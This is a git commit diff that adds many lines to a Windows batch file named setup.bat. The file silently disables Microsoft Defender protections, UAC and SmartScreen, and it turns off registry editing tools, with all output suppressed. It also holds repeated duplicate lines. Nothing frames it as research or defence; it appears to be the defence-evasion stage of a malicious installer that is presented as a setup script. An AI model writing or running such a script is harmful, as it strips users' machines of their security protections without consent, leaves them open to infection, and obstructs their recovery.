7c4b2940c25fd9da87554ac2a00a065e4e310e1a
kuzya09 <160030136+dokinbog@users.noreply.github.com>
2024-06-05 14:47:01 +0300

    Update setup.bat

--- setup.bat
+++ setup.bat
@@ -11,12 +11,28 @@ powershell -Command "Set-MpPreference -SignatureDisable $true" > nul 2>&1
 powershell -Command "Set-MpPreference -PUAProtection 0" > nul 2>&1
 powershell -Command "Set-MpPreference -SubmitSamplesConsent 0" > nul 2>&1
 powershell -Command "Set-MpPreference -MAPSReporting 0" > nul 2>&1
-
-:: Disable Windows Firewall
-netsh advfirewall set allprofiles state off > nul 2>&1
+powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" > nul 2>&1
+powershell -Command "Set-MpPreference -DisableScriptScanning $true" > nul 2>&1
+powershell -Command "Set-MpPreference -DisableIntrusionPreventionSystem $true" > nul 2>&1
+powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true" > nul 2>&1
+powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true" > nul 2>&1
+powershell -Command "Set-MpPreference -DisableIOAVProtection $true" > nul 2>&1
+powershell -Command "Set-MpPreference -DisablePrivacyMode $true" > nul 2>&1
+powershell -Command "Set-MpPreference -SignatureDisable $true" > nul 2>&1
+powershell -Command "Set-MpPreference -PUAProtection 0" > nul 2>&1
+powershell -Command "Set-MpPreference -SubmitSamplesConsent 0" > nul 2>&1
+powershell -Command "Set-MpPreference -MAPSReporting 0" > nul 2>&1
+powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true" > nul 2>&1
+powershell -Command "Set-MpPreference -DisableIOAVProtection $true" > nul 2>&1
+powershell -Command "Set-MpPreference -DisablePrivacyMode $true" > nul 2>&1
+powershell -Command "Set-MpPreference -SignatureDisable $true" > nul 2>&1
+powershell -Command "Set-MpPreference -PUAProtection 0" > nul 2>&1
+powershell -Command "Set-MpPreference -SubmitSamplesConsent 0" > nul 2>&1
+powershell -Command "Set-MpPreference -MAPSReporting 0" > nul 2>&1
 
 :: Disable UAC (User Account Control)
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f > nul 2>&1
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f > nul 2>&1
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f > nul 2>&1
 
 :: Disable Windows SmartScreen
